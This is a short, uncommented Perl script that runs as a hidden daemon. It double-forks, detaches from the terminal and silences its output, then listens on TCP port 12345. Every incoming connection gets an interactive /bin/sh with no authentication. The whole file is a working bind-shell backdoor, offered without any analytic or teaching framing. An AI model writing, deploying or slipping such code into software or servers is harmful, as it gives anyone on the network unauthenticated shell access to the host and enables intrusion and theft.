#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;
use POSIX qw(setsid);

sub daemonize {
    my $pid = fork();
    exit if $pid;
    exit unless defined($pid);

    setsid();
    $pid = fork();
    exit if $pid;
    exit unless defined($pid);

    close STDIN;
    close STDOUT;
    close STDERR;

    open STDIN, '<', '/dev/null';
    open STDOUT, '>', '/dev/null';
    open STDERR, '>', '/dev/null';
}

sub handle_connection {
    my $client = shift;

    open STDIN, "<&", $client or exit 0;
    open STDOUT, ">&", $client or exit 0;
    open STDERR, ">&", $client or exit 0;

    exec '/bin/sh' or exit 0;
}


daemonize();


my $socket = IO::Socket::INET->new(
    LocalPort => 12345,
    Type      => SOCK_STREAM,
    Reuse     => 1,
    Listen    => 10
) or exit 0;

while (1) {
    my $client = $socket->accept();
    next unless defined($client);
    
    my $pid = fork();
    if ($pid == 0) {
        handle_connection($client);
        exit 0;
    }
}
